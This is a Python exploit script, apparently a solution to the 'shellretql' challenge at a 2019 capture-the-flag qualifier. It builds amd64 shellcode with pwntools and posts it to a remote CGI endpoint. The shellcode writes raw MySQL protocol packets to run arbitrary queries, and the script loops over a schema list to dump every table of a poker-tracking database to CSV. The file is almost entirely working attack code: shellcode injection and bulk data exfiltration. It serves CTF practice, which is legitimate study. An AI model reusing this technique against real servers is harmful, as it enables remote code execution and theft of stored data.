#!/usr/bin/env python2
from pwn import *
import requests
import re
import string
from pymysql.protocol import MysqlPacket
import unicodedata
import StringIO
import csv


context.arch = "amd64"
context.os = "linux"

SCHEMA = \
    '''Action.RowID
Action.FK_Round_ID
Action.ActionTaken
Action.Amount
Action.SeatNum
Action.FK_Player_ID
Assoc_Player_Location._id
Assoc_Player_Stake._id
Expense._id
Expense.fk_player_id
Expense.FK_Session_id
Expense.FK_GenSup_id
Expense.Amount
Expense.CreateDate
Expense.Note
Expense.PaidForWithBuyin
GameLocations.RowID
GameLocations.LName
GameLocations.Latitude
GameLocations.Longitude
GameLocations.Note
GenericSupport.RowID
GenericSupport.LName
GenericSupport.LType
GenericSupport.Empty_Value
GenericSupport.SubType
MoneyLoan._id
MoneyLoan.CreateDate
MoneyLoan.Amount
MoneyLoan.loanWith
MoneyLoan.PhoneNum
MoneyLoan.APR
MoneyLoan.AmtPaidBack
MoneyLoan.IsLoan
MoneyLoan.InterestCharged
MoneyLoan.Note
PlayerHandRanges._id
Players._id
Players.Name
Players.PFRs
Players.VPiPs
Players.Hands
Players.Notes
Players.LastPlayed
Players.StatRecord
Players.StackSize
Players.Hero
Players.TellNotes
Players.ExploitNotes
Players.HandRangeNotes
Players.TableNotes
Players.QuickNotes
Players.ThreeBets
Players.ThreeBetHands
Players.Location
Players.Ethnicity
Players.AgeRange
Players.PFRs_LESS7
Players.VPiPs_LESS7
Players.Hands_LESS7
Players.Male
Players.Married
PlrNote._id
PlrNote.fk_player_id
PlrNote.fk_plrnote_id
PlrNote.Note
PlrNote.NoteType
PlrNote.CreateDate
PlrNote.LastModifiedDate
PlrNote.Stakes
PlrNote.Mood
Round.RowID
Round.FK_Hand_ID
Round.TheRound
SessionPerf._id
SessionPerf.FK_Session_id
SessionPerf.BasicPerformance
SessionPerf.GoalPerformance
SessionPerf.GoalPerformance2
SessionPerf.GoalPerformance3
SessionPerf.Variance
SessionPerf.SessionDur
SessionPerf.CreateDate
SessionPerf.Note'''.split('\n')

done = '''
PokerTable._id
PokerTable.Seat1
PokerTable.Seat2
PokerTable.Seat3
PokerTable.Seat4
PokerTable.Seat5
PokerTable.Seat6
PokerTable.Seat7
PokerTable.Seat8
PokerTable.Seat9
PokerTable.Seat10
PokerTable.Seat11
PokerTable.Seat1Enabled
PokerTable.Seat2Enabled
PokerTable.Seat3Enabled
PokerTable.Seat4Enabled
PokerTable.Seat5Enabled
PokerTable.Seat6Enabled
PokerTable.Seat7Enabled
PokerTable.Seat8Enabled
PokerTable.Seat9Enabled
PokerTable.Seat10Enabled
PokerTable.Seat11Enabled
PokerTable.tablename
PokerTable.isCurrent
Stake.RowID
Stake.LName
Stake.Default_Buyin
Stake.SmallBlind_Amount
Stake.BigBlind_Amount
Stake.Second_BB_Amount
Stake.NumBBDeep
Stake.BlindLength
Stake.Tournament
Stake.DeepStacked
Session.RowID
Session.Player
Session.Location
Session.Stakes
Session.CreateDate
Session.Date_Played
Session.Hours
Session.Profit
Session.Type
Session.Episode_Start
Session.Break_Hours
Session.Session_End
Session.Rebuy
Session.Rebuy_Cnt
Session.Cash_out
Session.Buyin
Session.FK_PokerTable
Session.Break_Start
Session.IsTournament
SessionNote.RowID
SessionNote.create_date
SessionNote.Fk_Session_Id
SessionNote.Won_Lost
SessionNote.note
Bankroll_Transaction._id
PokerHand.RowID
PokerHand.CreateDate
PokerHand.FK_Stakes_ID
PokerHand.FK_Location_ID
PokerHand.FK_Session_ID
PokerHand.ButtonPos
PokerHand.PotSize
PokerHand.FK_Winner_ID
PokerHand.WinningSeat
PokerHand.BoardCard_Rank_1
PokerHand.BoardCard_Suit_1
PokerHand.BoardCard_Rank_2
PokerHand.BoardCard_Suit_2
PokerHand.BoardCard_Rank_3
PokerHand.BoardCard_Suit_3
PokerHand.BoardCard_Rank_4
PokerHand.BoardCard_Suit_4
PokerHand.BoardCard_Rank_5
PokerHand.BoardCard_Suit_5
PokerHand.HandHtml
PokerHand.PreFlopNotes
PokerHand.FlopNotes
PokerHand.TurnNotes
PokerHand.RiverNotes
PokerHand.IsAnalyzed
PokerHand_Table.RowID
PokerHand_Table.FK_Hand_ID
'''

SCHEMA = [x.strip() for x in SCHEMA]


class TableDumper:

    def __init__(self, outfile_path=None):
        self.host = "http://shellretql.quals2019.oooverflow.io:9090/"
        self.path = "cgi-bin/index.php"
        self.url = self.host + self.path
        self.html = (
            'X-Powered-By: PHP/7.0.28-0ubuntu0.16.04.1\r\n'
            'Content-Type: text/html; charset=UTF-8\r\n\r\n'
            '<html></html>'
        )
        self.delim = 'scc'
        self.count_q = "select '{delim}',count({col}),'{delim2}' FROM {tbl};"
        self.cell_q = "select '{delim}',{col},'{delim2}' FROM {tbl} LIMIT 1 OFFSET {off};"
        self.encod = 'utf8'
        self.data = None
        self.last_r = None
        self.table_len = 0
        self.file_mode = 'a+'
        self.outfile_path = outfile_path
        self.outfile = None
        self.err_string = 'Error'
        if self.outfile_path:
            self.get_file()
        self.VERBOSE = False

    def get_file(self):
        if self.file:
            self.file.close()
        self.file = open(self.outfile_path, self.file_mode)

    def write_line(self, line):
        self.file.write(line)

    def build_q(self, q):
        # print q
        shellcode = ""
        shellcode += shellcraft.echo(p16(len(q)) + "\x00\x00\x03" + q, 4)
        shellcode += shellcraft.read(4, 'rsp', 200)
        shellcode += shellcraft.pushstr(self.html)
        shellcode += shellcraft.write(1, 'rsp', 500)
        self.data = {
            "shell": asm(shellcode) + "\x00"
        }
        return self.data

    def do_request(self):
        # if self.VERBOSE:
        #    print '[+] Query: {}'.format(self.data['shell'])
        self.last_r = requests.post(self.url, data=self.data)
        return self.last_r

    def do_query(self, q):
        self.build_q(q)
        return self.do_request()

    def get_result(self, q):
        res = self.do_query(q)
        # kills unicode bytes
        res = unicodedata.normalize('NFKD', res.text).encode('ascii', 'ignore')
        res = MysqlPacket(res, self.encod).dump()
        try:
            r = res.split(self.delim)[2].split(self.delim[::-1])[0]
        except IndexError:
            r = 'IndexError :/'
        return r

    def trim(self, s):
        while s.startswith('.'):
            s = s[1:]
        while s.endswith('.'):
            s = s[:-1]
        if '...' in s:
            s = s.split('...')[0]
        return s

    def get_count(self, tbl, col, set_table_len=False):
        c = self.get_result(self.count_q.format(
            delim=self.delim, col=col, delim2=self.delim[::-1], tbl=tbl
        ))
        c = int(self.trim(c))
        if set_table_len:
            self.table_len = c
            print '{} number of records in tbl {}'.format(c, tbl)
        return c

    def get_cell(self, tbl, col, off):
        q = self.cell_q.format(
            delim=self.delim, col=col, delim2=self.delim[::-1], tbl=tbl, off=off
        )
        res = self.get_result(q)
        while self.err_string in res:
            res = self.get_result(q)
        return res

    def dump_col(self, tbl, col):
        self.get_count(tbl, col, set_table_len=True)
        for off in range(self.table_len):
            r = self.get_cell(tbl, col, off)
            # print self.trim(r)

    def dump_row(self, tbl, cols, off=0):
        row = []
        assert(isinstance(row, list))
        for col in cols:
            row.append(self.trim(self. get_cell(tbl, col, off)))
        return row

    def dump_table(self, tbl, cols):
        self.get_count(tbl, cols[0], True)
        for off in range(self.table_len):
            r = self.dump_row(tbl, cols, off)
            line = StringIO.StringIO()
            writer = csv.writer(line)
            writer.writerow(r)
            print line.getvalue().strip()


def get_cols():
    d = {}
    for tc in SCHEMA:
        t = tc.split('.')[0]
        c = tc.split('.')[1]
        if t in d:
            d[t] = d[t] + [c]
        else:
            d[t] = [c]
    return d


if __name__ == '__main__':
    d = TableDumper()
    cols = get_cols()
    for tbl, cols in cols.items():
        print '{}.{}'.format(tbl, cols)
        d.dump_table(tbl, cols)
